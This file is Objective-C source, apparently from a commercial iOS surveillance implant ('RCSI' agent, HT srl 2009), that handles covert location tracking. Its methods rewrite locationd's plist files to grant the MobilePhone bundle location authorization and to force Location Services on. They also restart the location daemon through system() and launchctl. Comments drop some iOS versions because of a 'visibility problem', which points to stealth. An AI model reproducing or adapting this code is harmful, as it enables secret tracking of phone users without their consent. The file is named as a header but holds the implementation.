/*
 * RCSIAgentLocalizer.h
 *  Localizer Agent - through GPS or GSM cell
 *
 *
 * Created on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSIAgentPositionSupport.h"

#define GPS_AUTH_ALREADY_FOUND 1
#define GPS_AUTH_CREATED       2
#define GPS_AUTH_FAILED        3
#define GPS_CLIENT_PLIST @"/var/root/Library/Caches/locationd/clients.plist"

#define MP_ENTRY_BUNDLE_KEY @"BundleId"
#define MP_ENTRY_BUNDLE_VAL @"com.apple.mobilephone"
#define MP_ENTRY_EXEC_KEY @"Executable"
#define MP_ENTRY_EXEC_VAL @"/Applications/MobilePhone.app/MobilePhone"
#define MP_ENTRY_AUTH_KEY @"Authorized"
#define MP_ENTRY_PROMPT_KEY @"PromptedSettings"

static _i_AgentPositionSupport *sharedInstance = nil;

@implementation _i_AgentPositionSupport

@synthesize mLastCheckDate;

#pragma mark -
#pragma mark - GPS Agent support 
#pragma mark -

-(void)loadLocationd
{
  char statment[256];
  
  snprintf(statment, 
           sizeof(statment), 
           "/bin/launchctl %s \"/System/Library/LaunchDaemons/%s\"", 
           "load", 
           "com.apple.locationd.plist");
  
  system(statment);
}

-(void)unloadLocationd
{
  char statment[256];
  
  snprintf(statment, 
           sizeof(statment), 
           "/bin/launchctl %s \"/System/Library/LaunchDaemons/%s\"", 
           gOSMajor == 5?"remove":"unload", 
           gOSMajor == 5?"com.apple.locationd":"com.apple.locationd.plist");
  
  system(statment);
}

- (void)startGPSDaemon
{
  [self loadLocationd];
}

-(void)restartGPSDaemon
{
  [self unloadLocationd];
  sleep(1);
  [self loadLocationd];
}

#define LOCATION_SERVICE_IOS4_KEY @"LocationEnabled"
#define LOCATION_SERVICE_IOS5_KEY @"LocationServicesEnabled"

#define LOCATION_SERVICE_PLIST @"/var/mobile/Library/Preferences/com.apple.locationd.plist"

- (NSDictionary*)createMobilePhoneAppClientPlistEntry
{
  NSDictionary *mpDictionary = nil;
  
  NSNumber *one = [NSNumber numberWithInt:1];
  
  switch (gOSMajor)
  {
    case 5:
    {
      mpDictionary = 
      [NSDictionary dictionaryWithObjectsAndKeys:one, MP_ENTRY_AUTH_KEY,
       MP_ENTRY_BUNDLE_VAL, MP_ENTRY_BUNDLE_KEY,
       @"", MP_ENTRY_EXEC_KEY,
       @"", @"Registered",
       one, MP_ENTRY_PROMPT_KEY,
       nil];
      break;
    }
    case 4:
    {
      mpDictionary = 
      [NSDictionary dictionaryWithObjectsAndKeys:one, MP_ENTRY_AUTH_KEY,
       MP_ENTRY_BUNDLE_VAL, MP_ENTRY_BUNDLE_KEY,
       MP_ENTRY_EXEC_VAL, MP_ENTRY_EXEC_KEY,
       one, MP_ENTRY_PROMPT_KEY,
       nil];
      break;
    }
    case 3:
    {
      mpDictionary = 
      [NSDictionary dictionaryWithObjectsAndKeys:one,  MP_ENTRY_BUNDLE_VAL, nil];
      break;
    }
  }
  
  return mpDictionary;
}

- (BOOL)saveClientsFile:(NSDictionary*)theDictionary andEntries:(NSDictionary*)theEntries
{
  NSMutableDictionary *newClientsPlist = [NSMutableDictionary dictionaryWithCapacity:2];
  
  if (theEntries != nil)
    [newClientsPlist addEntriesFromDictionary: theEntries];
  
  [newClientsPlist setValue: theDictionary forKey: MP_ENTRY_BUNDLE_VAL];
  
  NSString *error;
  id plist = [NSPropertyListSerialization dataFromPropertyList:(id)newClientsPlist
                                                        format:NSPropertyListBinaryFormat_v1_0 
                                              errorDescription:&error];
  
  if([plist writeToFile: GPS_CLIENT_PLIST atomically:YES] == TRUE)
    return TRUE;
  else
    return FALSE;
}

- (int)checkMobilePhoneAppClient:(NSMutableDictionary*)theClients
{
  NSNumber *one = [NSNumber numberWithInt:1];
  
  NSDictionary *allowedClients = [theClients objectForKey: @"KnownClients"];
  
  if ([allowedClients objectForKey: MP_ENTRY_BUNDLE_VAL] == nil)
  {
    NSMutableDictionary *newclientsDict = [NSMutableDictionary dictionaryWithDictionary: allowedClients];
    
    NSDictionary *appDict = [NSDictionary dictionaryWithObject:one  forKey:MP_ENTRY_BUNDLE_VAL];
    
    [newclientsDict addEntriesFromDictionary:appDict];
    
    [theClients setValue:newclientsDict forKey: @"KnownClients"];
    
    id plist = [NSPropertyListSerialization dataFromPropertyList:(id)theClients
                                                          format:NSPropertyListBinaryFormat_v1_0 
                                                errorDescription:nil];
    
    if([plist writeToFile: LOCATION_SERVICE_PLIST atomically:YES])
      return GPS_AUTH_CREATED;
    else
      return GPS_AUTH_FAILED;
  } 
  else
    return GPS_AUTH_ALREADY_FOUND;
}

- (int)checkAuthorizationiOS3
{
  NSNumber *one = [NSNumber numberWithInt:1];
  
  NSDictionary *appDict = [NSDictionary dictionaryWithObject:one  forKey:MP_ENTRY_BUNDLE_VAL];
  NSMutableDictionary *knowClientDict = [NSDictionary dictionaryWithObject: appDict forKey: @"KnownClients"];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: LOCATION_SERVICE_PLIST] == FALSE)
  {
    id plist = [NSPropertyListSerialization dataFromPropertyList:(id)knowClientDict
                                                          format:NSPropertyListBinaryFormat_v1_0 
                                                errorDescription:nil];
    
    if([plist writeToFile:LOCATION_SERVICE_PLIST atomically:YES] == TRUE)
      return GPS_AUTH_CREATED;
    else
    {
      return GPS_AUTH_FAILED;
    }
  }
  
  NSMutableDictionary *clients = [NSMutableDictionary dictionaryWithContentsOfFile: LOCATION_SERVICE_PLIST];
  
  if (clients == nil)
    return GPS_AUTH_FAILED;
  
  if ([clients objectForKey: @"KnownClients"] != nil)
  {
    return [self checkMobilePhoneAppClient: clients];
  }
  else
  {
    [clients addEntriesFromDictionary:knowClientDict];
    
    id plist = [NSPropertyListSerialization dataFromPropertyList:(id)clients
                                                          format:NSPropertyListBinaryFormat_v1_0 
                                                errorDescription:nil];
    
    if([plist writeToFile: LOCATION_SERVICE_PLIST atomically:YES])
      return GPS_AUTH_CREATED;
    else
      return GPS_AUTH_FAILED;
  }
}

- (int)checkMobilePhoneAppAuthorizationiOS4
{
  NSDictionary *mpDictionaryentry = [self createMobilePhoneAppClientPlistEntry];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: GPS_CLIENT_PLIST] == FALSE)
  {
    if([self saveClientsFile: mpDictionaryentry andEntries:nil] == TRUE)
      return GPS_AUTH_CREATED;
    else
    {
      return GPS_AUTH_FAILED;
    }
  }
  
  NSDictionary *clients = [NSDictionary dictionaryWithContentsOfFile: GPS_CLIENT_PLIST];
  
  if (clients == nil)
    return GPS_AUTH_FAILED;
  
  if ([clients objectForKey: MP_ENTRY_BUNDLE_KEY] != nil)
    return GPS_AUTH_ALREADY_FOUND;
  
  if ([self saveClientsFile: mpDictionaryentry andEntries: clients] == YES)
    return GPS_AUTH_CREATED;
  else
  {
    return GPS_AUTH_FAILED;
  }
}

- (int)checkMobilePhoneAuthorization
{
  int retVal = GPS_AUTH_FAILED;
  
  switch (gOSMajor) 
  {
    case 5:
    {
      /* 
       * not supported for visibility problem
       */
      break;
    }
    case 4:
    {
      retVal = [self checkMobilePhoneAppAuthorizationiOS4];
      break;
    } 
    case 3:
    {
      /* 
       * not supported for visibility problem
       */
      break;
    } 
  }
  
  return retVal;
}

- (BOOL)enableLocationService
{
  NSNumber *one = [NSNumber numberWithInt:1];
  NSString *lsKey = nil;
  
  switch (gOSMajor)
  {
    case 5:
    { 
      /* 
       * not supported for visibility problem
       */
      return FALSE;
    }
    case 4:
    {
      lsKey = LOCATION_SERVICE_IOS4_KEY;
      
      NSDictionary *lsDict = [NSMutableDictionary dictionaryWithContentsOfFile: LOCATION_SERVICE_PLIST];
      
      if (lsDict == nil)
        return FALSE;
      
      NSNumber *lsVal = [lsDict objectForKey: lsKey];
      
      if (lsVal == nil || [lsVal intValue] == 0)
      {
        [lsDict setValue:one forKey:lsKey];
        
        id plist = [NSPropertyListSerialization dataFromPropertyList:(id)lsDict
                                                              format:NSPropertyListBinaryFormat_v1_0 
                                                    errorDescription:nil];
        
        return [plist writeToFile: LOCATION_SERVICE_PLIST atomically:YES];
      }
      return TRUE;
    }
    case 3:
    {
      /* 
       * not supported for visibility problem
       */
      return FALSE;
    }
  }
  
  return FALSE;
}

- (void)enableGPSPosition
{
  [[NSFileManager defaultManager] createFileAtPath:GPS_FLAG_FILEPATH 
                                          contents:nil 
                                        attributes:nil];
}

- (void)disableGPSPosition
{
  [[NSFileManager defaultManager] removeItemAtPath:GPS_FLAG_FILEPATH 
                                             error:nil];
}

- (BOOL)setupLocationService
{
  BOOL retVal = TRUE;
  int  gpsAuth = GPS_AUTH_FAILED;
  
  [self disableGPSPosition];
  
  if ([self enableLocationService] == FALSE)
  {
    return FALSE;
  }
  
  gpsAuth = [self checkMobilePhoneAuthorization];
  
  switch (gpsAuth)
  {
    case GPS_AUTH_FAILED:
    {
      retVal = FALSE;
      break;
    }
    case GPS_AUTH_CREATED:
    {
      [self restartGPSDaemon];
      [self enableGPSPosition];
      break;
    }
    case GPS_AUTH_ALREADY_FOUND:
    {
      [self startGPSDaemon];
      [self enableGPSPosition];
      break;
    }
  }
  
  return retVal;
}

- (BOOL)setupWifiService
{
  return TRUE;
}

#define POS_MAX_TIMEOUT 1

- (void)checkAndSetupLocationServices:(UInt32*)aFlag
{
  NSDate *date = [NSDate date];
  
  if (aFlag != NULL &&
      ([date timeIntervalSince1970] - [mLastCheckDate timeIntervalSince1970]) > POS_MAX_TIMEOUT)
  {
    [self setMLastCheckDate: date];
    
    if (*aFlag & POS_MODULES_GPS_ENABLE)
      [self setupLocationService];
    
    if (*aFlag & POS_MODULES_WIF_ENABLE)
      [self setupWifiService];

  }
}
#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (_i_AgentPositionSupport *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedInstance;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
    {
      sharedInstance = [super allocWithZone: aZone];
      return sharedInstance;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  return UINT_MAX;
}

- (oneway void)release
{
  
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedInstance != nil)
    {
      self = [super init];
      if (self)
        mLastCheckDate = nil;
    }
  }
  
  return sharedInstance;
}

- (void)dealloc
{ 
  [super dealloc];
}

@end
